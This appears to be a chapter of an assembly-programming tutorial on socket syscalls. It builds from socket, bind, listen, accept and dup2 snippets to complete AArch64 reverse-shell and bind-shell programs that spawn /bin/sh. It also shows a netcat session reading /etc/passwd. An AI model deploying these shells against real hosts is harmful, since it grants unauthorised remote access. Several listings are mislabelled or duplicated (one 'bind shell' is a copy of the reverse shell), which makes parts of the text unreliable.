
## Network

[libsocket](https://github.com/dermesser/libsocket)

### Open a socket
```arm
@ opening the socket                                                           
xor eax,eax
push eax
push 0x1
push 0x2
mov ecx,esp             @ socket_args                                            

xor ebx,ebx
inc ebx                 @ SYS_SOCKET                                             

mov al,0x66             @ SYS_SOCKETCALL                                         

int 0x80
```

strace
```bash
execve("./open_socket", ["./open_socket"], [/* 20 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
```

### Bind()

```arm

@ get host_addr
xor eax,eax
push eax                @ 0,0
push WORD 0x697a        @ htonos(31337)
push WORD 0x02          @ 2
mov ecx,esp

@
push 0x16               @ sizeof(host_addr)
push ecx                @ host_addr
push esi                @ assume esi stores socketfd

xor ebx,ebx
mov bl,0x2              ;SYS_BIND

mov ecx,esp             ;socket_args

mov al,0x66             ;SYS_SOCKETCALL
int 0x80
```

strace
```bash
execve("./bind_socket", ["./bind_socket"], [/* 20 vars */]) = 0
bind(0, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 22) = -1 ENOTSOCK (Socket operation on non-socket)
```

### Listen()

```arm
tart:
        xor ecx,ecx
        mov cl,0x5

        push ecx                @ 5
        push esi                @ socketfd

        mov ecx, esp            @ socket_args = {5,socketfd}

        xor ebx,ebx
        mov bl, 0x4             @ SYS_LISTEN

        xor eax,eax
        mov al,0x66             @ SYS_SOCKETCALL
        int 0x80
```

strace
```bash
execve("./listen_socket", ["./listen_socket"], [/* 20 vars */]) = 0
listen(0, 5)                            = -1 ENOTSOCK (Socket operation on non-socket)
```

### Accept()

```c
sin_size = sizeof(struct sockaddr_in);

  //accept incoming connection
  int accept_args[] = {server, (int) &client_addr, (int) &sin_size};
  client = socketcall(SYS_ACCEPT, (long *) accept_args);
```
```arm
section .text
        global _start

_start:
        xor ecx,ecx
        push ecx                @ 0
        push ecx                @ 0
        push esi                @ socketfd
        mov ecx,esp             @ socket_args = {socketfd,0,0}

        xor ebx,ebx
        mov bl, 0x5             @ SYS_LISTEN

        xor eax,eax
        mov al,0x66             @ SYS_SOCKETCALL
        int 0x80
```
```bash
execve("./accept_socket", ["./accept_socket"], [/* 20 vars */]) = 0
accept(0, 0, NULL)                      = -1 ENOTSOCK (Socket operation on non-socket)
```

Finally, the system call number for dup2() is 0x3f. That leaves us with the following code assembly for dup2() if we assume esi stores our sockfd

```arm
    mov ebx,esi             ;sockfd
    xor ecx,ecx             ;stdin 0

    xor eax,eax
    mov al, 0x3f
    int 0x80

    inc ecx                 ;stdout 1
    xor eax,eax
    mov al, 0x3f
    int 0x80

    inc ecx                 ;stderr 2
    xor eax,eax
    mov al, 0x3f
    int 0x80
```

connect remotely
```bash
    $ netcat 192.168.56.101 31337
    ...
    accept(3, 0, NULL)                      = 4
    dup2(4, 0)                              = 0
    dup2(4, 1)                              = 1
    dup2(4, 2)                              = 2
    execve("/bin//sh", [0], [/* 0 vars */]) = 0
    ...
    cat /etc/passwd 
    root:x:0:0:root:/root:/bin/bash
```

### Listen for Incoming Connections
```arm
    mov     r0, r4  @ r0 = saved host_sockid 
    mov     r1, #2
    add     r7, #2  @ r7 = 284 (listen syscall number)
    svc     #1
```
### Accept Incoming Connection
```arm
    mov     r0, r4       @ r0 = saved host_sockid 
    sub     r1, r1, r1   @ clear r1, r1 = 0
    sub     r2, r2, r2   @ clear r2, r2 = 0
    add     r7, #1       @ r7 = 285 (accept syscall number)
    svc     #1
    mov     r4, r0       @ save result (client_sockid) in r4
```

### Execute a Shell
```arm
    @ execve("/bin/sh", 0, 0) 
    adr r0, shellcode  @ r0 = location of "/bin/shX"
    eor r1, r1, r1     @ clear register r1. R1 = 0
    eor r2, r2, r2     @ clear register r2. r2 = 0
    strb r2, [r0, #7]  @ store null-byte for AF_INET
    mov r7, #11        @ execve syscall number
    svc #1
    nop
 ```

### Reverse shell over TCP
create an outgoing connection to remote and spawn a shell accepting input onn port 1234
```arm
    .arch armv8-a

    .include "macro.inc"

    .equ PORT, 1234
    .equ HOST, 0x0100007F @ 127.0.0.1

    .global _start
    .text

_start:
    @ s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    mov     x8, SYS_socket
    mov     x2, IPPROTO_IP
    mov     x1, SOCK_STREAM
    mov     x0, AF_INET
    svc     0

    mov     w3, w0       @ w3 = s

    @ connect(s, &sa, sizeof(sa));
    mov     x8, SYS_connect
    mov     x2, 16
    movq    x1, ((HOST << 32) | ((((PORT & 0xFF) << 8) | (PORT >> 8)) << 16) | AF_INET)
    str     x1, [sp, -16]!
    mov     x1, sp     @ x1 = &sa 
    svc     0

    @ dup3(s, STDERR_FILENO, 0);
    @ dup3(s, STDOUT_FILENO, 0);
    @ dup3(s, STDIN_FILENO,  0);
    mov     x8, SYS_dup3
    mov     x1, STDERR_FILENO + 1
c_dup:
    mov     x2, xzr
    mov     w0, w3
    subs    x1, x1, 1
    svc     0
    bne     c_dup

    @ execve("/bin/sh", NULL, NULL);
    mov     x8, SYS_execve
    movq    x0, BINSH
    str     x0, [sp]
    mov     x0, sp
    svc     0
```

### Bind shell over TCP

```arm
    .arch armv8-a

    .include "macro.inc"

    .equ PORT, 1234

    .global _start
    .text

_start:
    @ s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    mov     x8, SYS_socket
    mov     x2, IPPROTO_IP
    mov     x1, SOCK_STREAM
    mov     x0, AF_INET
    svc     0

    mov     w3, w0       @ w3 = s

    @ bind(s, &sa, sizeof(sa));  
    mov     x8, SYS_bind
    mov     x2, 16
    movl    w1, (((((PORT & 0xFF) << 8) | (PORT >> 8)) << 16) | AF_INET)
    str     x1, [sp, -16]!
    mov     x1, sp
    svc     0

    @ listen(s, 1);
    mov     x8, SYS_listen
    mov     x1, 1
    mov     w0, w3
    svc     0

    @ r = accept(s, 0, 0);
    mov     x8, SYS_accept
    mov     x2, xzr
    mov     x1, xzr
    mov     w0, w3
    svc     0

    mov     w3, w0

    @ dup3(s, STDERR_FILENO, 0);
    @ dup3(s, STDOUT_FILENO, 0);
    @ dup3(s, STDIN_FILENO,  0);
    mov     x8, SYS_dup3
    mov     x1, STDERR_FILENO + 1
c_dup:
    mov     w0, w3
    subs    x1, x1, 1
    svc     0
    bne     c_dup

    @ execve("/bin/sh", NULL, NULL);
    mov     x8, SYS_execve
    movq    x0, BINSH
    str     x0, [sp]
    mov     x0, sp
    svc     0
```

### Bind shell (listen for incoming)

Rather than use PC-relative instructions, the network address structure is initialized using immediate values.
```arm
    .arch armv8-a

    .include "macro.inc"

    .equ PORT, 1234
    .equ HOST, 0x0100007F // 127.0.0.1

    .global _start
    .text

_start:
    @ s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    mov     x8, SYS_socket
    mov     x2, IPPROTO_IP
    mov     x1, SOCK_STREAM
    mov     x0, AF_INET
    svc     0

    mov     w3, w0       @ w3 = s

    @ connect(s, &sa, sizeof(sa));
    mov     x8, SYS_connect
    mov     x2, 16
    movq    x1, ((HOST << 32) | ((((PORT & 0xFF) << 8) | (PORT >> 8)) << 16) | AF_INET)
    str     x1, [sp, -16]!
    mov     x1, sp     @ x1 = &sa 
    svc     0

    @ dup3(s, STDERR_FILENO, 0);
    @ dup3(s, STDOUT_FILENO, 0);
    @ dup3(s, STDIN_FILENO,  0);
    mov     x8, SYS_dup3
    mov     x1, STDERR_FILENO + 1
c_dup:
    mov     x2, xzr
    mov     w0, w3
    subs    x1, x1, 1
    svc     0
    bne     c_dup

    @ execve("/bin/sh", NULL, NULL);
    mov     x8, SYS_execve
    movq    x0, BINSH
    str     x0, [sp]
    mov     x0, sp
    svc     0
```

### Synchronized shell

 I/O handles with pipe descriptors.
```arm
  // assign read end to stdin
  dup3(in[0],  STDIN_FILENO,  0);
  // assign write end to stdout   
  dup3(out[1], STDOUT_FILENO, 0);
  // assign write end to stderr  
  dup3(out[1], STDERR_FILENO, 0);  
```

The write end of out is assigned to stdout and stderr while the read end of in is assigned to stdin. We can perform this with the following.
```arm
    mov     x8, SYS_dup3
    mov     x2, xzr
    mov     x1, xzr
    ldr     w0, [sp, in0]
    svc     0

    add     x1, x1, 1
    ldr     w0, [sp, out1]
    svc     0

    add     x1, x1, 1
    ldr     w0, [sp, out1]
    svc     0
```

Eleven instructions or 44 bytes are used for this. If we want to save a few bytes, we could use a loop instead. The value of STDIN_FILENO is conveniently zero and STDERR_FILENO is 2. We can simply loop from 0 to 3 and use a ternary operator to choose the correct descriptor.
```c
  for (i=0; i<3; i++) {
    dup3(i==0 ? in[0] : out[1], i, 0);
  }
```

to perform the same operation in assembly, we can use the CSEL instruction.
```arm
    mov     x8, SYS_dup3
    mov     x1, (STDERR_FILENO + 1) // x1 = 3
    mov     x2, xzr                 @ x2 = 0
    ldp     w4, w3, [sp, out1]      @ w4 = out[1], w3 = in[0]
c_dup:
    subs    x1, x1, 1           
    csel    w0, w3, w4, eq          @ w0 = (x1==0) ? in[0] : out[1]
    svc     0
    cbnz    x1, c_dup
```

```c
In C, it simply closes each one in separate statements like so

  // close pipes
  close(in[0]);  close(in[1]);
  close(out[0]); close(out[1]);
```
For the assembly, a loop is used instead. Six instructions instead of eight
```arm
    mov     x1, 4*4          @ i = 4
    mov     x8, SYS_close
cls_pipe:
    sub     x1, x1, 4        @ i--
    ldr     w0, [sp, x1]     @ w0 = pipes[i]
    svc     0
    cbnz    x1, cls_pipe     @ while (i != 0)
```

The epoll_pwait system call is used instead of the pselect6 system call to monitor file descriptors. Before calling epoll_pwait we must create an epoll file descriptor using epoll_create1 and add descriptors to it using epoll_ctl. The following code does that once a connection to remote peer has been established

```arm
    mov     x8, SYS_epoll_ctl
    add     x3, sp, evts       @ x3 = &evts
    mov     x1, EPOLL_CTL_ADD  @ x1 = EPOLL_CTL_ADD
    mov     x4, EPOLLIN

    ldr     w2, [sp, s]        @ w2 = s
    stp     x4, x2, [sp, evts]
    ldr     w0, [sp, efd]      @ w0 = efd
    svc     0

    ldr     w2, [sp, out0]     @ w2 = out[0]
    stp     x4, x2, [sp, evts]
    ldr     w0, [sp, efd]      @ w0 = efd
    svc     0
```

Loop version
```
    @ epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
    ldr     w2, [sp, s]
    ldr     w4, [sp, out0]
poll_init:
    mov     x8, SYS_epoll_ctl
    mov     x1, EPOLL_CTL_ADD
    add     x3, sp, evts
    stp     x1, x2, [x3]
    ldr     w0, [sp, efd]
    svc     0
    cmp     w2, w4
    mov     w2, w4
    bne     poll_init
```
The value returned by the epoll_pwait system call must be checked before continuing to process the events structure. If successful, it will return the number of file descriptors that were signalled while -1 will indicate an error.

A64 provides a conditional branch opcode that allows us to execute the IF statement in one instruction
```arm
    tbnz    x0, 31, cls_efd
```

After this check, we then need to determine if the signal was the result of input. We are only monitoring for input to a read end of pipe and socket. Every other event would indicate an error.
The value of EPOLLIN is 1, and we only want those type of events. By masking the value of events with 1 using a bitwise AND, if the result is zero, then the peer has disconnected. Load pair is used to load both the events and data_fd values simultaneously

x0 = evts.events, x1 = evts.data.fd
```arm
    ldp     x0, x1, [sp, evts]
```

if (!(evts.events & EPOLLIN)) break;
```arm
    tbz     w0, 0, cls_efd
```

Our code will read from either out[0] or s

assign socket or read end of output
```arm
  r = (fd == s) ? s     : out[0];
```

assign socket or write end of input
```arm
  w = (fd == s) ? in[1] : s;
```

Using the highly useful conditional select instruction, we can select the correct descriptors to read and write to

w3 = s
```arm
    ldr     w3, [sp, s]
```

w5 = in[1], w4 = out[0]
```arm
    ldp     w5, w4, [sp, in1]
```
fd == s
```arm
    cmp     w1, w3
```

r = (fd == s) ? s : out[0];
```arm
    csel    w0, w3, w4, eq
```

w = (fd == s) ? in[1] : s;
```arm
    csel    w3, w5, w3, eq
```

[src Socket Programming in Assembly](https://ansonliu.com/si485-site/lec/15/lec.html)

[NEXT -> Concurrency](concurrency.md)

<div align="center">
  <img src="../img/argo-mascot.jpg" alt="Logo">
</div>
<p align="center">
    <img src="https://raw.githubusercontent.com/bornmay/bornmay/Update/svg/Bottom.svg" alt="Github Stats" />
</p>
<p align="right">(<a href="#top">back to top</a>)</p>
